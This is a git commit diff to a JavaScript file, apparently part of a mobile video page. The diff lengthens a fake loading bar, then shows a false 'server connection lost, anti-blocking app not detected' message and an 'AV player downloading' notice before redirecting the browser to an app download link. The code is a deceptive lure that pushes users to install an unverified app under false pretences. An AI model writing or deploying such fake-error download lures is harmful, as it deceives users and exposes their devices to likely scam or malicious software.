235f3fee3d19708800e78a9a3a30671ff1bcf5cd
aifuli <aifuli@users.noreply.github.com>
2015-02-03 13:29:24 +0800

    Update tj.js

--- ios/tj.js
+++ ios/tj.js
@@ -6,11 +6,11 @@ function count(){
 	bar=bar+2;
 	amount=amount+line;
 	document.getElementById('baifenbi').innerHTML=bar+"%";
-	if(bar<16){
-		setTimeout("count()",500);
+	if(bar<90){
+		setTimeout("count()",100);
 	}else{
 		alert(tixing);
-		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="color:#c3c3c3;">不能观看？点此下载播放器</span></a>';
+		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><p><span style="height:25px;line-height:25px;font-size:13px;color:#c3c3c3;">服务器连接断开：系统未检测到防屏蔽手机专用APP！高清内容，缓冲快，点击下载！</span></p><p><img src="http://ww2.sinaimg.cn/large/005X4kGljw1eovcjiyx64g304m01gt8j.gif" width="100" height="30" /></p></a>';
 		document.getElementById('note').innerHTML='<div style="height:25px;line-height:25px;font-size:13px;color:#00FF00;">AV播放器下载中，请耐心等待，一会提醒您安装...</div>';
 		window.location.href=appurl2;
 	}
